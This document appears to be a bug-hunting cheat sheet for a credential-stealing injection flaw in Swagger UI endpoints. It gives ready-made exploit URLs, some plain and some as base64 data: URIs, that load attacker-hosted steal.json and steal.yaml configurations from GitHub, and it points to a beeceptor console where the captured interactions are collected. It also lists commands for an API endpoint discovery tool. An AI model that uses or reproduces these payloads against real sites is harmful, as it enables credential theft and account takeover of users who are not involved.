### Issue: Credentials Stealing: Injection Vulnerability on a Swagger Endpoint

Blog https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers

Site:
```bash
site.com/swagger-ui.html
site.com/swagger
AnyEndpoint Doesn't matter

```
Exploit:
```bash
site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
site.com/swagger?config=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
site.com/swagger?url=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.yaml
?configUrl=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC55YW1sIgp9
?url=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC55YW1sIgp9
?configUrl=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC5qc29uIgp9
?url=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC5qc29uIgp9

```

PUT your credentials there.
then go to: https://app.beeceptor.com/console/sahil3276 and look for interactions

---------------------------------------------------------------------------------
### Api Endpoint Detect
```bash
pip install -r api_detector_requirements.txt
```
```bash
python apidetector.py -i list_subdomains.txt -o results_file.txt -t 30 -ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
```

- To scan with both HTTP and HTTPS protocols:
  ``` bash
  python apidetector.py -m -d example.com
  ```
---------------------------------------------------------------------------------
### Tip
- if these endpoints are found
``` bash
/swagger
/api/docs
/openapi.json
/openapi.yaml
/v2/api-docs
```
- run
  ``` bash
  ?format=html
  ?deep=true
  ```
